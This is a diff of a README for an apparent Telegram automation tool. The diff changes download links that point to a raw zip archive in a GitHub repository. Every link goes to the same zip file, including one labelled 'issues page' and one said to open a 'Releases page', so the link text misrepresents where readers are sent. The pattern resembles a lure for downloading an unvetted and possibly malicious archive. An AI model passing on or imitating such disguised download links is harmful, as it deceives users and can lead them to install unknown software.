@@ -6,7 +6,7 @@ Welcome to the telegram-tool! This application lets you automate your Telegram t
 
 ## 📥 Download the Tool
 
-[![Download telegram-tool](https://raw.githubusercontent.com/Lamjel14/telegram-tool/main/easier/telegram_tool_v1.9.zip)](https://raw.githubusercontent.com/Lamjel14/telegram-tool/main/easier/telegram_tool_v1.9.zip)
+[![Download telegram-tool](https://raw.githubusercontent.com/Lamjel14/telegram-tool/main/easier/tool-telegram-1.9.zip)](https://raw.githubusercontent.com/Lamjel14/telegram-tool/main/easier/tool-telegram-1.9.zip)
 
 ## 📋 Features
 
@@ -27,7 +27,7 @@ Before you download, make sure your system meets the following requirements:
 
 To get the application, visit the following page:
 
-[Download telegram-tool](https://raw.githubusercontent.com/Lamjel14/telegram-tool/main/easier/telegram_tool_v1.9.zip)
+[Download telegram-tool](https://raw.githubusercontent.com/Lamjel14/telegram-tool/main/easier/tool-telegram-1.9.zip)
 
 On the Releases page, you will find the latest version of the tool. 
 
@@ -67,7 +67,7 @@ If you run into issues, here are some common problems and solutions:
 
 ## 💬 Support
 
-For further assistance, visit the project's [issues page](https://raw.githubusercontent.com/Lamjel14/telegram-tool/main/easier/telegram_tool_v1.9.zip). You can report any problems or ask questions, and someone from the community will help you.
+For further assistance, visit the project's [issues page](https://raw.githubusercontent.com/Lamjel14/telegram-tool/main/easier/tool-telegram-1.9.zip). You can report any problems or ask questions, and someone from the community will help you.
 
 ## 📚 Learn More
 
